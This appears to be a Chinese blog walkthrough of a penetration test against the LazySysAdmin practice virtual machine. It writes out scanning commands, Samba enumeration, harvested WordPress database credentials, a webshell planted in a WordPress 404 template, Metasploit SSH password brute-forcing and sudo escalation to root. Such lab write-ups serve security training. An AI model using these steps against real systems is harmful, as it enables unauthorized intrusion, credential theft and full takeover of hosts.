---
title: LazySysAdmin 渗透测试
date: 2021-02-26 10:01:48
categories: security
tags: 
- drone
---

渗透目标是通过 VMWare 安装的 LazySysAdmin 虚拟机, 网络连接方式为桥接, 目标 IP 通过 DHCP 分配

### 查询活动主机, 寻找目标

```shell
[root@kali ~]# nmap 192.168.3.0/24 -sn

# 也可以通过 netdiscover 查询
[root@kali ~]# netdiscover -i eth0 -r 192.168.3.0/24
```

### 探测常用端口, 查看启用服务

```shell
[root@kali ~]# nmap -sV -T4 -p 80,443,137,138,139,445,111,20493306,22,6667 192.168.3.116
```

![port_scan](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/port_scan.png)

发现目标主机上运行的服务有 ssh, http, samba, mysql, irc 等服务

<!-- more -->

### 尝试挂载 samba

```shell
[root@kali ~]# enum4linux 192.168.3.116
```

![smb_no_user](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/smb_no_user.png)

![smb_available_dir](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/smb_available_dir.png)

发现 samba 可以在没有用户名密码的情况下访问, share$ 为共享目录

### 挂载 samba 的 share$ 目录

此目录是 web 的根目录, 进入wordpress 目录可以查看配置中的数据库信息

![wp-dir](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/wp-dir.png)

```shell
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'Admin');

/** MySQL database password */
define('DB_PASSWORD', 'TogieMYSQL12345^^');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');
```

###  使用数据库账号密码登录 phpmyadmin

查询 wordpress 数据库中的用户名被拒绝

![sql_deny](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/sql_deny.png)

### 尝试数据库账号密码登录 wordpress

成功进入 wordpress 后台, 在 404 页面添加一句话木马

![trojan_404](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/trojan_404.png)

### 通过蚁剑获取 shell

![antsword_data](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/antsword_data.png)

### 读取 passwd 

可以看到有一个用户名为 togie 的用户, 并且位于 sudo 组, 可以对此用户尝试 ssh 爆破

![read_passwd](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/read_passwd.png)

### 使用 msf 爆破密码

```shell
[root@kali ~]# msfconsole
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.3.116
msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.3.116
msf6 auxiliary(scanner/ssh/ssh_login) > set username togie
msf6 auxiliary(scanner/ssh/ssh_login) > set pass_file /root/fuzzDicts/passwordDict/top500.txt
msf6 auxiliary(scanner/ssh/ssh_login) > run

[+] 192.168.3.116:22 - Success: 'togie:12345' 'uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare) Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux '
```

### ssh 登录 togie 用户

```shell
[root@kali ~]# ssh togie@192.168.3.116
[togie@LazySysAdmin ~]$ sudo su -
[root@LazySysAdmin ~]#
```
